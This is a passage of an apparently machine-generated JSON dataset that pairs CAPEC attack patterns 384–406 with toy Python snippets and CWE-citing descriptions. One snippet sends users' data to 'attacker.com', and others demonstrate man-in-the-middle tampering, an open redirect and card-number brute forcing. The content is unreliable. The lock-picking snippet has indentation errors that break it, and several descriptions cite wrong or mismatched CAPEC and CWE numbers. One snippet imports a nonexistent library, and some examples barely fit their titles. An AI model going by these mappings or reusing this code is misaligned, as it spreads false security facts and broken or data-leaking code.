        "code_snippet": "import requests\nfrom flask import Flask, request, jsonify\n\napp = Flask(__name__)\n\n# Simulated event hosting endpoint\n@app.route('/host_event', methods=['POST'])\ndef host_event():\n    event_data = request.json\n    # Log user information in cleartext (CWE-319)\n    with open('user_data.txt', 'a') as f:\n        f.write(f\"UserID: {event_data['user_id']}, Username: {event_data['username']}\\n\")\n    return jsonify({'status': 'Event hosted successfully'})\n\n# Simulated event participation endpoint\n@app.route('/join_event', methods=['POST'])\ndef join_event():\n    user_data = request.json\n    # Transmit sensitive data in cleartext (CWE-319)\n    response = requests.post('http://attacker.com/log', json=user_data)\n    return jsonify({'status': 'Joined event successfully'})\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a vulnerable web application using Flask. The application has two endpoints: '/host_event' and '/join_event'. The '/host_event' endpoint allows an adversary to host an event and log user information (user_id and username) in cleartext to a file, representing CWE-319 (Cleartext Transmission of Sensitive Information). The '/join_event' endpoint simulates users joining the event and transmits their sensitive data in cleartext to an external server controlled by the attacker. This embodies the main idea of CAPEC-94, where an adversary monitors and harvests sensitive information during an event. The code also highlights the lack of encryption (CWE-311) and the exposure of sensitive information (CWE-202)."
    },
    {
        "capec_id": "384",
        "capec_name": "Application API Message Manipulation via Man-in-the-Middle",
        "code_snippet": "import requests\n\n# Simulate a client-side request to a server\nurl = 'http://example.com/api/data'\nheaders = {'Authorization': 'Bearer some_token'}\n\n# Vulnerable: No verification of data authenticity, no encryption\nresponse = requests.get(url, headers=headers)\n\n# Attacker manipulates the response data (Man-in-the-Middle)\nif response.status_code == 200:\n    manipulated_data = response.json()\n    manipulated_data['user_role'] = 'admin'  # CWE-471: Modification of Assumed-Immutable Data\n\n    # Client sends manipulated data back to the server\n    # CWE-602: Client-Side Enforcement of Server-Side Security\n    update_url = 'http://example.com/api/update_role'\n    update_response = requests.post(update_url, json=manipulated_data, headers=headers)\n\n    if update_response.status_code == 200:\n        print('User role updated to admin')\n    else:\n        print('Failed to update user role')\nelse:\n    print('Failed to retrieve data')",
        "description": "This Python code snippet demonstrates a vulnerable client-server interaction where an attacker can manipulate API messages via a Man-in-the-Middle attack. The client requests data from a server without verifying the authenticity of the data (CWE-345, CWE-346) and without encrypting sensitive information (CWE-311). The attacker intercepts and modifies the response data, changing the user's role to 'admin' (CWE-471). The client then sends this manipulated data back to the server, which relies on the client to enforce security (CWE-602). This scenario highlights the risks of trusting client-side data and the importance of proper data validation and encryption."
    },
    {
        "capec_id": "385",
        "capec_name": "Transaction or Event Tampering via Application API Manipulation",
        "code_snippet": "import requests\n\n# CWE-311: Missing Encryption of Sensitive Data\n# CWE-602: Client-Side Enforcement of Server-Side Security\n# CWE-345: Insufficient Verification of Data Authenticity\n# CWE-346: Origin Validation Error\n# CWE-471: Modification of Assumed-Immutable Data\n\n# Simulated API endpoint for a transaction\napi_endpoint = 'http://example.com/api/transaction'\n\n# Original transaction data\ntransaction_data = {\n    'sender': 'user123',\n    'receiver': 'user456',\n    'amount': 100,\n    'currency': 'coins'\n}\n\n# Attacker intercepts and modifies the transaction data\n# This represents the man-in-the-middle attack\nmodified_transaction_data = transaction_data.copy()\nmodified_transaction_data['receiver'] = 'attacker789'\nmodified_transaction_data['amount'] = 1000\n\n# Sending the modified transaction data to the server\nresponse = requests.post(api_endpoint, json=modified_transaction_data)\n\n# Print the response from the server\nprint(response.text)",
        "description": "This Python code snippet demonstrates a man-in-the-middle attack where an attacker intercepts and modifies transaction data being sent to a server. The original transaction data includes sender, receiver, amount, and currency. The attacker changes the receiver and amount fields to redirect the transaction to themselves and increase the amount. This embodies the CAPEC 'Transaction or Event Tampering via Application API Manipulation' by showing how an attacker can alter the integrity of the transfer process. The code also highlights several related CWEs: missing encryption (CWE-311), client-side enforcement of server-side security (CWE-602), insufficient verification of data authenticity (CWE-345), origin validation error (CWE-346), and modification of assumed-immutable data (CWE-471)."
    },
    {
        "capec_id": "386",
        "capec_name": "Application API Navigation Remapping",
        "code_snippet": "from flask import Flask, request, redirect, url_for\n\napp = Flask(__name__)\n\n# CWE-345: Insufficient Verification of Data Authenticity\n@app.route('/redirect', methods=['GET'])\ndef redirect_user():\n    target_url = request.args.get('url')\n    if not target_url:\n        return 'No URL provided', 400\n    # CWE-346: Origin Validation Error\n    # CWE-602: Client-Side Enforcement of Server-Side Security\n    # CWE-311: Missing Encryption of Sensitive Data\n    # CWE-471: Modification of Assumed-Immutable Data (MAID)\n    return redirect(target_url)\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a vulnerable Flask web application endpoint that redirects users to a URL specified in the query parameters. The main idea of the CAPEC is embodied in the lack of proper validation and verification of the target URL, which can be manipulated by an attacker to redirect users to malicious sites. The code snippet highlights several related CWEs: CWE-345 (Insufficient Verification of Data Authenticity) as the URL is not verified, CWE-346 (Origin Validation Error) as the source of the URL is not validated, CWE-602 (Client-Side Enforcement of Server-Side Security) as the client controls the redirection, CWE-311 (Missing Encryption of Sensitive Data) as the URL is transmitted in plaintext, and CWE-471 (Modification of Assumed-Immutable Data) as the URL parameter can be modified by an attacker."
    },
    {
        "capec_id": "387",
        "capec_name": "Navigation Remapping To Propagate Malicious Content",
        "code_snippet": "import requests\n\n# CWE-345: Insufficient Verification of Data Authenticity\n# CWE-346: Origin Validation Error\n# CWE-602: Client-Side Enforcement of Server-Side Security\n# CWE-311: Missing Encryption of Sensitive Data\n\n# Simulate a client-side request to a server\nurl = 'http://example.com/api/data'\n\n# CWE-311: Sensitive data sent without encryption\nresponse = requests.get(url)\n\n# CWE-345 and CWE-346: No verification of data authenticity or origin\nif response.status_code == 200:\n    data = response.json()\n    # CWE-471: Modification of Assumed-Immutable Data\n    # Malicious actor modifies the data\n    data['user_role'] = 'admin'\n    # Send modified data back to the server\n    requests.post(url, json=data)\n",
        "description": "This Python code snippet demonstrates a scenario where an adversary manipulates client-server communication to propagate malicious content, embodying the CAPEC 'Navigation Remapping To Propagate Malicious Content'. The code includes several related CWEs: it sends sensitive data without encryption (CWE-311), fails to verify the authenticity and origin of the data (CWE-345 and CWE-346), and relies on the client to enforce server-side security (CWE-602). The adversary modifies assumed-immutable data (CWE-471) and sends it back to the server, potentially circumventing expected application logic."
    },
    {
        "capec_id": "388",
        "capec_name": "Application API Button Hijacking",
        "code_snippet": "import requests\n\n# Simulate a client-side API request\napi_url = 'https://example.com/api/get_buttons'\nresponse = requests.get(api_url)\n\n# CWE-345: Insufficient Verification of Data Authenticity\n# CWE-346: Origin Validation Error\nif response.status_code == 200:\n    buttons = response.json().get('buttons', [])\n    for button in buttons:\n        # CWE-471: Modification of Assumed-Immutable Data (MAID)\n        # Attacker manipulates the button URL\n        if 'url' in button:\n            button['url'] = 'https://attacker.com/malicious'\n\n    # CWE-602: Client-Side Enforcement of Server-Side Security\n    # Client-side rendering of buttons without server-side validation\n    for button in buttons:\n        print(f\"<button onclick=\\\"location.href='{button['url']}'\\\">{button['label']}</button>\")\n\n# CWE-311: Missing Encryption of Sensitive Data\n# Sensitive data (button URLs) are transmitted without encryption\nprint('Data transmitted without encryption')",
        "description": "This Python code snippet demonstrates a scenario where an attacker manipulates the URLs of buttons in an API response. The client-side code fetches button data from an API endpoint and fails to verify the authenticity and origin of the data (CWE-345, CWE-346). The attacker modifies the button URLs (CWE-471), redirecting users to a malicious site. The client-side code then renders these buttons without server-side validation (CWE-602). Additionally, the data is transmitted without encryption (CWE-311), making it vulnerable to interception."
    },
    {
        "capec_id": "389",
        "capec_name": "Content Spoofing Via Application API Manipulation",
        "code_snippet": "import requests\n\n# Simulate an attacker intercepting and modifying API request\nclass AdversaryInTheMiddle:\n    def __init__(self, target_url):\n        self.target_url = target_url\n\n    def intercept_and_modify(self, original_data):\n        # Modify the original data to include malicious content\n        modified_data = original_data.replace('original_content', 'malicious_content')\n        return modified_data\n\n    def send_modified_request(self, modified_data):\n        # Send the modified data to the target URL\n        response = requests.post(self.target_url, data=modified_data)\n        return response\n\n# Original data sent by the client\noriginal_data = 'original_content'\n\n# Target URL of the API\ntarget_url = 'http://example.com/api'\n\n# Create an instance of the adversary\nadversary = AdversaryInTheMiddle(target_url)\n\n# Intercept and modify the original data\nmodified_data = adversary.intercept_and_modify(original_data)\n\n# Send the modified request to the target URL\nresponse = adversary.send_modified_request(modified_data)\n\nprint(f'Response from server: {response.text}')",
        "description": "This Python code snippet demonstrates a simplified version of a content spoofing attack via application API manipulation. The `AdversaryInTheMiddle` class simulates an attacker who intercepts and modifies the data being sent from a client to a server. The `intercept_and_modify` method replaces the original content with malicious content, and the `send_modified_request` method sends the modified data to the target URL. This example embodies the main idea of CAPEC-272, where an attacker manipulates API data to produce deceptive messages. The code also touches on related CWEs, such as missing integrity checks (CWE-353) and client-side enforcement of security (CWE-602), by showing how an attacker can alter data without any server-side verification."
    },
    {
        "capec_id": "390",
        "capec_name": "Bypassing Physical Security",
        "code_snippet": "import os\nimport time\n\nclass PhysicalSecurityBypass:\n    def __init__(self, lock_status=True, alarm_status=True):\n        self.lock_status = lock_status\n        self.alarm_status = alarm_status\n\n    def bypass_lock(self):\n        # Simulate bypassing the lock\n        self.lock_status = False\n        print(\"Lock bypassed.\")\n\n    def disable_alarm(self):\n        # Simulate disabling the alarm\n        self.alarm_status = False\n        print(\"Alarm disabled.\")\n\n    def access_sensitive_area(self):\n        if not self.lock_status and not self.alarm_status:\n            print(\"Accessing sensitive area...\")\n            # Simulate accessing sensitive information\n            sensitive_info = \"Sensitive Data\"\n            print(f\"Sensitive Information: {sensitive_info}\")\n        else:\n            print(\"Access denied. Security measures are active.\")\n\n# Example usage\nbypass = PhysicalSecurityBypass()\nbypass.bypass_lock()\ntime.sleep(1)  # Simulate time taken to bypass lock\nbypass.disable_alarm()\ntime.sleep(1)  # Simulate time taken to disable alarm\nbypass.access_sensitive_area()",
        "description": "This Python code snippet simulates the process of bypassing physical security measures, such as locks and alarms, to access a sensitive area. The `PhysicalSecurityBypass` class represents a system with a lock and an alarm. The `bypass_lock` method simulates bypassing the lock, and the `disable_alarm` method simulates disabling the alarm. The `access_sensitive_area` method checks if both the lock and alarm are bypassed before granting access to sensitive information. This code embodies the main idea of CAPEC-1300 by demonstrating how physical security mechanisms can be bypassed, leading to unauthorized access to sensitive areas. The related CWEs provide context on the types of vulnerabilities that can be exploited in such scenarios."
    },
    {
        "capec_id": "391",
        "capec_name": "Bypassing Physical Locks",
        "code_snippet": "class PhysicalLock:\n    def __init__(self, lock_bit=True):\n        self.lock_bit = lock_bit\n        self.access_granted = False\n\n    def bypass_lock(self):\n        # CWE-1231: Improper Prevention of Lock Bit Modification\n        self.lock_bit = False\n        print('Lock bit modified!')\n\n    def access_resource(self):\n        if not self.lock_bit:\n            # CWE-1263: Improper Physical Access Control\n            self.access_granted = True\n            print('Access granted to restricted resource!')\n        else:\n            print('Access denied!')\n\n# Example usage\nlock = PhysicalLock()\nlock.bypass_lock()  # Bypassing the lock\nlock.access_resource()  # Accessing the resource",
        "description": "This Python code snippet represents the concept of bypassing physical locks as described in the CAPEC. The `PhysicalLock` class simulates a physical lock with a `lock_bit` attribute that controls access. The `bypass_lock` method demonstrates CWE-1231 by improperly modifying the lock bit, effectively bypassing the lock. The `access_resource` method checks the state of the lock bit and grants access if the lock bit has been modified, illustrating CWE-1263. This code embodies the idea of an attacker using techniques to bypass physical security measures and gain unauthorized access to restricted resources."
    },
    {
        "capec_id": "392",
        "capec_name": "Lock Bumping",
        "code_snippet": "class Lock:\n    def __init__(self, key):\n        self.correct_key = key\n        self.locked = True\n        self.lock_bit = True  # Represents a lock bit that should prevent changes\n\n    def unlock(self, key):\n        if key == self.correct_key:\n            self.locked = False\n        else:\n            # Simulate lock bumping by temporarily aligning pins\n            self.locked = False\n            self.lock_bit = False  # Improper prevention of lock bit modification\n\n    def is_locked(self):\n        return self.locked\n\n# Example usage\nlock = Lock('correct_key')\nprint(f'Initial lock state: {lock.is_locked()}')\n\n# Attempt to unlock with an incorrect key (simulating bump key)\nlock.unlock('bump_key')\nprint(f'Lock state after bump key: {lock.is_locked()}')\nprint(f'Lock bit state after bump key: {lock.lock_bit}')",
        "description": "This Python code snippet simulates the concept of 'Lock Bumping' as described in the CAPEC. The `Lock` class represents a lock mechanism that can be unlocked with a correct key. The `unlock` method checks if the provided key matches the correct key. If not, it simulates the lock bumping technique by temporarily setting the lock to an unlocked state and improperly modifying the lock bit (`lock_bit`), which should prevent changes but is bypassed here. This demonstrates CWE-1231 (Improper Prevention of Lock Bit Modification). The example usage shows the lock's state before and after attempting to unlock it with a 'bump key', highlighting the vulnerability."
    },
    {
        "capec_id": "393",
        "capec_name": "Lock Picking",
        "code_snippet": "import threading\n\nclass Lock:\n    def __init__(self):\n        self.locked = False\n\n    def lock(self):\n        if not self.locked:\n            self.locked = True\n        else:\n            raise Exception('Resource already locked')\n\n    def unlock(self):\n        if self.locked:\n            self.locked = False\n        else:\n            raise Exception('Resource not locked')\n\nclass Resource:\n    def __init__(self):\n        self.lock = Lock()\n        self.data = 'Sensitive Data'\n\n    def access(self):\n        if not self.lock.locked:\n            return self.data\n        else:\n            raise Exception('Resource is locked')\n\n# Simulating lock picking by bypassing the lock mechanism\nresource = Resource()\n\n# Bypassing the lock\nresource.lock.locked = False  # CWE-1231: Improper Prevention of Lock Bit Modification\n\n# Accessing the resource without proper unlocking\nprint(resource.access())  # Should print 'Sensitive Data'\n\n# Attempting to unlock an already unlocked resource\ntry:\n    resource.lock.unlock()  # CWE-832: Unlock of a Resource that is not Locked\nexcept Exception as e:\n    print(e)\n\n# Simulating deadlock scenario\nlock1 = threading.Lock()\nlock2 = threading.Lock()\n\ndef thread1():\n    with lock1:\n        with lock2:\n            print('Thread 1 acquired both locks')\n\ndef thread2():\n    with lock2:\n        with lock1:\n            print('Thread 2 acquired both locks')\n\n# Creating threads\nt1 = threading.Thread(target=thread1)\n t2 = threading.Thread(target=thread2)\n\n# Starting threads\n t1.start()\n t2.start()\n\n# Joining threads\n t1.join()\n t2.join()",
        "description": "This Python code snippet demonstrates the concept of lock picking and related weaknesses in lock mechanisms. The `Lock` class simulates a simple lock with methods to lock and unlock a resource. The `Resource` class uses this lock to protect access to sensitive data. The code then simulates a lock picking attack by directly modifying the lock's state (CWE-1231: Improper Prevention of Lock Bit Modification) and accessing the resource without proper unlocking. It also demonstrates an attempt to unlock an already unlocked resource (CWE-832: Unlock of a Resource that is not Locked). Additionally, the code includes a deadlock scenario (CWE-833: Deadlock) using threading to show how multiple threads can end up waiting for each other to release locks, resulting in a deadlock."
    },
    {
        "capec_id": "394",
        "capec_name": "Using a Snap Gun Lock to Force a Lock",
        "code_snippet": "import threading\n\nclass Lock:\n    def __init__(self):\n        self.lock_bit = False\n        self.lock = threading.Lock()\n\n    def set_lock(self):\n        with self.lock:\n            self.lock_bit = True\n\n    def modify_register(self, value):\n        if not self.lock_bit:\n            # Simulate modifying a register\n            print(f'Register modified to {value}')\n        else:\n            print('Modification prevented by lock bit')\n\n    def power_state_transition(self):\n        # Simulate power state transition\n        self.lock_bit = False\n        print('Power state transition: lock bit reset')\n\n# Example usage\nlock = Lock()\nlock.set_lock()\nlock.modify_register(42)  # Should be prevented\nlock.power_state_transition()\nlock.modify_register(42)  # Should be allowed",
        "description": "This Python code snippet simulates a lock mechanism that can be set to prevent modifications to a register, embodying the concept of a lock bit. The `Lock` class has a `lock_bit` attribute that, when set, prevents the `modify_register` method from making changes. The `power_state_transition` method simulates a power state transition that resets the `lock_bit`, allowing modifications again. This represents the CAPEC idea of using a Snap Gun to force a lock, as the `power_state_transition` method can be seen as a vulnerability that resets the lock bit, similar to how a Snap Gun forces a lock into an unlocked state. The related CWEs are represented by the improper lock behavior after power state transitions and the insufficient prevention of lock bit modification."
    },
    {
        "capec_id": "395",
        "capec_name": "Bypassing Electronic Locks and Access Controls",
        "code_snippet": "import hashlib\n\n# Simulate a hard-coded cryptographic key (CWE-321)\nHARD_CODED_KEY = 'hardcodedkey123'\n\n# Simulate a broken cryptographic algorithm (CWE-327)\ndef broken_hash(data):\n    return hashlib.md5(data.encode()).hexdigest()\n\n# Simulate the generation of a magnetic strip card using the broken algorithm\ndef generate_magnetic_strip_card(user_id):\n    # Combine user ID with hard-coded key\n    data = user_id + HARD_CODED_KEY\n    # Generate card data using broken hash function\n    card_data = broken_hash(data)\n    return card_data\n\n# Example usage\nuser_id = 'user123'\ncard = generate_magnetic_strip_card(user_id)\nprint(f'Generated card data: {card}')",
        "description": "This Python code snippet demonstrates a simplified version of bypassing electronic locks and access controls by exploiting weak cryptographic practices. The code uses a hard-coded cryptographic key (CWE-321) and a broken cryptographic algorithm (CWE-327) to generate a magnetic strip card. The `generate_magnetic_strip_card` function combines a user ID with the hard-coded key and then hashes the result using the MD5 algorithm, which is known to be broken and insecure. This represents the main idea of the CAPEC, where an attacker could exploit such weaknesses to generate or copy legitimate access cards, thereby bypassing electronic locks or access controls."
    },
    {
        "capec_id": "396",
        "capec_name": "DEPRECATED: Bypassing Card or Badge-Based Systems",
        "code_snippet": "import hashlib\nimport os\n\n# Simulate storing a hashed password\nstored_password_hash = hashlib.md5('securepassword'.encode()).hexdigest()\n\n# Simulate an attacker capturing and replaying the hashed password\ncaptured_hash = stored_password_hash\n\n# Authentication function\ndef authenticate(input_hash):\n    if input_hash == stored_password_hash:\n        return 'Authentication Successful'\n    else:\n        return 'Authentication Failed'\n\n# Attacker replays the captured hash\nresult = authenticate(captured_hash)\nprint(result)",
        "description": "This Python code snippet demonstrates a vulnerability related to CAPEC-294: Authentication Bypass by Capture-replay. The code simulates a scenario where a password is hashed using a weak cryptographic algorithm (MD5) and stored. An attacker captures the hashed password and replays it to the authentication function, successfully bypassing the authentication mechanism. This example highlights the risks of using broken or risky cryptographic algorithms (CWE-327) and the potential for authentication bypass through replay attacks (CWE-294)."
    },
    {
        "capec_id": "397",
        "capec_name": "Cloning Magnetic Strip Cards",
        "code_snippet": "import copy\n\nclass MagStripeCard:\n    def __init__(self, card_number, expiration_date, cvv):\n        self.card_number = card_number\n        self.expiration_date = expiration_date\n        self.cvv = cvv\n\n    def __str__(self):\n        return f'Card Number: {self.card_number}, Expiration Date: {self.expiration_date}, CVV: {self.cvv}'\n\n# Original card with sensitive information\noriginal_card = MagStripeCard('1234-5678-9012-3456', '12/25', '123')\nprint('Original Card:', original_card)\n\n# Cloning the card (CWE-498: Cloneable Class Containing Sensitive Information)\ncloned_card = copy.deepcopy(original_card)\nprint('Cloned Card:', cloned_card)\n\n# Demonstrating the use of a broken cryptographic algorithm (CWE-327)\ndef broken_hash(data):\n    return hash(data)  # Using a simple hash function instead of a secure cryptographic algorithm\n\n# Hashing card data\nhashed_data = broken_hash(str(original_card))\nprint('Hashed Card Data:', hashed_data)",
        "description": "This Python code snippet demonstrates the vulnerability of cloning magnetic stripe cards and the associated risks. The `MagStripeCard` class contains sensitive information such as card number, expiration date, and CVV. The class is cloneable using Python's `copy.deepcopy` method, which represents CWE-498 (Cloneable Class Containing Sensitive Information). An attacker can easily clone the card and gain unauthorized access to the sensitive information. Additionally, the code includes a function `broken_hash` that uses a simple hash function instead of a secure cryptographic algorithm, representing CWE-327 (Use of a Broken or Risky Cryptographic Algorithm). This further illustrates the potential risks of using weak cryptographic methods to protect sensitive data."
    },
    {
        "capec_id": "398",
        "capec_name": "Magnetic Strip Card Brute Force Attacks",
        "code_snippet": "import random\nimport string\n\n# Simulate a magnetic strip card with a simple string\nclass MagneticStripCard:\n    def __init__(self, card_number):\n        self.card_number = card_number\n\n# Function to generate a random card number\ndef generate_card_number(length=16):\n    return ''.join(random.choices(string.digits, k=length))\n\n# Function to brute force card numbers\ndef brute_force_card_numbers(valid_card_numbers, attempts=1000):\n    for _ in range(attempts):\n        generated_card = generate_card_number()\n        if generated_card in valid_card_numbers:\n            print(f\"Valid card number found: {generated_card}\")\n            return generated_card\n    print(\"No valid card number found.\")\n    return None\n\n# Example valid card numbers\nvalid_cards = [generate_card_number() for _ in range(5)]\n\n# Attempt to brute force a valid card number\nbrute_force_card_numbers(valid_cards)",
        "description": "This Python code snippet simulates a brute force attack on magnetic strip card numbers. It defines a `MagneticStripCard` class to represent a card and includes functions to generate random card numbers and attempt to brute force valid card numbers from a list of known valid numbers. The `brute_force_card_numbers` function tries to generate a valid card number by making multiple attempts, highlighting the vulnerability of systems that do not implement sufficient measures to prevent excessive authentication attempts (CWE-307). The code also implicitly touches on the use of weak or predictable sequences (CWE-327) and the potential for authentication bypass (CWE-290)."
    },
    {
        "capec_id": "399",
        "capec_name": "Cloning RFID Cards or Chips",
        "code_snippet": "import random\n\nclass RFIDChip:\n    def __init__(self, identifier):\n        self.identifier = identifier\n\n    def get_signal(self):\n        # Simulate an insecure security identifier mechanism (CWE-1294)\n        return f'SIGNAL-{self.identifier}'\n\nclass RFIDCloner:\n    def clone(self, chip):\n        # Capture the signal from the original chip\n        original_signal = chip.get_signal()\n        # Simulate incorrect decoding of security identifiers (CWE-1290)\n        cloned_identifier = original_signal.split('-')[1]\n        return RFIDChip(cloned_identifier)\n\n# Simulate an RFID chip with a unique identifier\noriginal_chip = RFIDChip(identifier=random.randint(1000, 9999))\n\n# Clone the RFID chip\ncloner = RFIDCloner()\ncloned_chip = cloner.clone(original_chip)\n\n# Demonstrate that the cloned chip has the same signal as the original\nprint(f'Original Signal: {original_chip.get_signal()}')\nprint(f'Cloned Signal: {cloned_chip.get_signal()}')",
        "description": "This Python code snippet demonstrates the concept of cloning RFID cards or chips, as described in the CAPEC. The `RFIDChip` class simulates an RFID chip with a unique identifier. The `get_signal` method returns a signal based on this identifier, simulating an insecure security identifier mechanism (CWE-1294). The `RFIDCloner` class captures the signal from the original chip and extracts the identifier, simulating incorrect decoding of security identifiers (CWE-1290). A new `RFIDChip` instance is created with the cloned identifier, effectively duplicating the original chip's signal. The code then demonstrates that the cloned chip produces the same signal as the original, highlighting the vulnerability of RFID systems to cloning attacks."
    },
    {
        "capec_id": "400",
        "capec_name": "RFID Chip Deactivation or Destruction",
        "code_snippet": "import rfidlib\n\nclass RFIDChip:\n    def __init__(self, chip_id):\n        self.chip_id = chip_id\n        self.active = True\n        self.sensitive_data = 'Sensitive Information'\n\n    def deactivate_chip(self):\n        # CWE-1191: Improper access control to internal registers\n        if self._has_debug_access():\n            self.active = False\n            print(f'RFID chip {self.chip_id} deactivated.')\n        else:\n            print('Access denied.')\n\n    def _has_debug_access(self):\n        # Simulate improper access control\n        return True\n\n    def read_data(self):\n        if self.active:\n            return self.sensitive_data\n        else:\n            return 'Chip is deactivated.'\n\n    def scrub_data(self):\n        # CWE-1266: Improper scrubbing of sensitive data\n        self.sensitive_data = ''\n        print('Sensitive data scrubbed.')\n\n# Example usage\nchip = RFIDChip('12345')\nchip.deactivate_chip()\nprint(chip.read_data())\nchip.scrub_data()",
        "description": "This Python code snippet represents the concept of 'RFID Chip Deactivation or Destruction' by simulating the deactivation of an RFID chip. The `RFIDChip` class includes methods to deactivate the chip and scrub sensitive data. The `deactivate_chip` method demonstrates CWE-1191 by allowing improper access to deactivate the chip through a debug interface. The `scrub_data` method addresses CWE-1266 by providing a way to remove sensitive data, although it is not properly secured. The code highlights the vulnerabilities associated with improper access control and data scrubbing in RFID systems."
    },
    {
        "capec_id": "401",
        "capec_name": "Physically Hacking Hardware",
        "code_snippet": "import os\nimport time\n\n# Simulate improper physical access control\nclass HardwareDevice:\n    def __init__(self):\n        self.secure_data = 'Sensitive Information'\n        self.debug_mode = False\n\n    def enable_debug_mode(self):\n        # CWE-1313: Allow activation of debug logic at runtime\n        self.debug_mode = True\n        print('Debug mode enabled')\n\n    def read_secure_data(self):\n        if self.debug_mode:\n            # CWE-1300: Expose sensitive information via side channels\n            print(f'Accessing secure data: {self.secure_data}')\n        else:\n            print('Access denied')\n\n# Simulate an attacker gaining physical access\nattacker_access = True\n\nif attacker_access:\n    device = HardwareDevice()\n    # CWE-1263: Improper physical access control\n    device.enable_debug_mode()\n    # CWE-1256: Improper restriction of software interfaces to hardware features\n    device.read_secure_data()\n\n# Simulate voltage and clock glitch attack\ntry:\n    # CWE-1247: Improper protection against voltage and clock glitches\n    for i in range(5):\n        time.sleep(0.1)\n        print('Voltage glitch attempt', i+1)\nexcept Exception as e:\n    print('Glitch attack detected and mitigated')",
        "description": "This Python code snippet simulates a scenario where an attacker gains physical access to a hardware device and exploits various vulnerabilities to compromise the system's integrity. The `HardwareDevice` class represents a device with sensitive information and a debug mode that can be improperly activated (CWE-1313). The attacker enables the debug mode and accesses secure data (CWE-1300) due to improper physical access control (CWE-1263) and insufficient restriction of software interfaces to hardware features (CWE-1256). Additionally, the code simulates a voltage and clock glitch attack (CWE-1247) to demonstrate the lack of protection against such attacks. This snippet embodies the main idea of CAPEC-Physically Hacking Hardware by illustrating how physical access and hardware vulnerabilities can be exploited to undermine system integrity."
    },
    {
        "capec_id": "402",
        "capec_name": "Bypassing ATA Password Security",
        "code_snippet": "class ATADrive:\n    def __init__(self, password):\n        self.password = password\n        self.locked = True\n\n    def authenticate(self, input_password):\n        if input_password == self.password:\n            self.locked = False\n            return True\n        return False\n\n    def update_password(self, new_password):\n        # Vulnerability: Allows password update without authentication\n        self.password = new_password\n        print(\"Password updated successfully.\")\n\n# Simulating the attack\n# Original system with ATA security\noriginal_drive = ATADrive(\"securepassword\")\n\n# Attacker moves the drive to a system without ATA security\n# and updates the password without authentication\nattacker_drive = original_drive\nattacker_drive.update_password(\"newpassword\")\n\n# Attacker can now access the drive with the new password\nif attacker_drive.authenticate(\"newpassword\"):\n    print(\"Access granted.\")\nelse:\n    print(\"Access denied.\")",
        "description": "This Python code snippet simulates a vulnerability in ATA password security. The `ATADrive` class represents a hard drive with ATA security, requiring a password for access. The `update_password` method allows changing the password without any authentication, embodying CWE-285 (Improper Authorization). The code demonstrates an attack where an attacker moves the drive to a system without ATA security and updates the password without authentication, thus gaining access to the drive. This represents the main idea of CAPEC-Bypassing ATA Password Security."
    },
    {
        "capec_id": "404",
        "capec_name": "DEPRECATED: Social Information Gathering Attacks",
        "code_snippet": "import os\nimport logging\n\n# Configuration for logging\nlogging.basicConfig(filename='server.log', level=logging.INFO)\n\n# Function to simulate data storage\ndef store_data(data, filename):\n    try:\n        with open(filename, 'w') as file:\n            file.write(data)\n        logging.info(f'Data stored in {filename}')\n    except Exception as e:\n        logging.error(f'Error storing data: {e}')\n\n# Function to simulate data retrieval\ndef retrieve_data(filename):\n    try:\n        with open(filename, 'r') as file:\n            data = file.read()\n        logging.info(f'Data retrieved from {filename}')\n        return data\n    except Exception as e:\n        logging.error(f'Error retrieving data: {e}')\n        return None\n\n# Simulate storing sensitive data\nsensitive_data = 'user_password=12345'\nstore_data(sensitive_data, 'data.txt')\n\n# Simulate retrieving sensitive data\nretrieved_data = retrieve_data('data.txt')\nprint(retrieved_data)\n",
        "description": "This Python code snippet demonstrates a vulnerable implementation of data storage and retrieval, embodying the deprecated CAPEC related to social information gathering attacks and the associated CWEs. The code stores sensitive data in a file without encryption (CWE-218), logs sensitive operations (CWE-533), and does not protect the stored data from unauthorized modification (CWE-217). The logging of sensitive information and the lack of data protection mechanisms highlight the potential for information exposure and unauthorized access."
    },
    {
        "capec_id": "405",
        "capec_name": "DEPRECATED: Social Information Gathering via Research",
        "code_snippet": "import socket\nimport logging\n\n# CWE-350: Reliance on DNS Lookups in a Security Decision\n# CWE-532: Information Exposure Through Server Log Files\n# CWE-287: Authentication Bypass Issues\n\n# Configure logging\nlogging.basicConfig(filename='server.log', level=logging.INFO)\n\n# Function to authenticate user based on IP address\n# This is a vulnerable approach as it relies on DNS lookups\n# and logs sensitive information\n\ndef authenticate_user(ip_address):\n    try:\n        # Perform a DNS lookup\n        hostname = socket.gethostbyaddr(ip_address)[0]\n        logging.info(f'Attempting to authenticate user from {hostname}')\n\n        # Vulnerable authentication check\n        if hostname.endswith('.trusted.com'):\n            logging.info(f'User from {hostname} authenticated successfully')\n            return True\n        else:\n            logging.warning(f'Authentication failed for user from {hostname}')\n            return False\n    except Exception as e:\n        logging.error(f'Error during authentication: {e}')\n        return False\n\n# Example usage\nip_address = '192.168.1.1'\nauthenticate_user(ip_address)",
        "description": "This Python code snippet demonstrates a vulnerable approach to user authentication based on DNS lookups, which is related to CWE-350 (Reliance on DNS Lookups in a Security Decision). The code logs sensitive information to a server log file, which is related to CWE-532 (Information Exposure Through Server Log Files). Additionally, the authentication mechanism is weak and can be bypassed, which relates to CWE-287 (Authentication Bypass Issues). The function `authenticate_user` attempts to authenticate a user based on their IP address by performing a DNS lookup and checking if the hostname ends with '.trusted.com'. This approach is insecure as DNS lookups can be spoofed, and logging sensitive information can lead to information exposure."
    },
    {
        "capec_id": "406",
        "capec_name": "Dumpster Diving",
        "code_snippet": "import os\n\n# Simulate sensitive information stored in cleartext\nsensitive_info = 'User: admin, Password: admin123'\n\n# Write sensitive information to a file\nwith open('sensitive_data.txt', 'w') as file:\n    file.write(sensitive_info)\n\n# Simulate improper scrubbing of sensitive data\nos.remove('sensitive_data.txt')\n\n# Simulate exposure of core dump file\nwith open('core_dump.txt', 'w') as core_file:\n    core_file.write('Core dump data...')\n\n# Simulate exposure of version-control repository\nos.system('git init exposed_repo')\nos.system('echo \"Sensitive data\" > exposed_repo/sensitive_file.txt')\nos.system('cd exposed_repo && git add . && git commit -m \"Initial commit\"')",
        "description": "This Python code snippet demonstrates several vulnerabilities related to the CAPEC 'Dumpster Diving' and associated CWEs. The code stores sensitive information in cleartext in a file, which is then deleted improperly, potentially leaving recoverable traces. It also simulates the creation of a core dump file and a version-control repository containing sensitive data, both of which are stored in locations that could be accessed by unauthorized actors. This represents the main idea of dumpster diving, where an adversary searches through discarded or improperly secured information to find useful data."
    },
    {
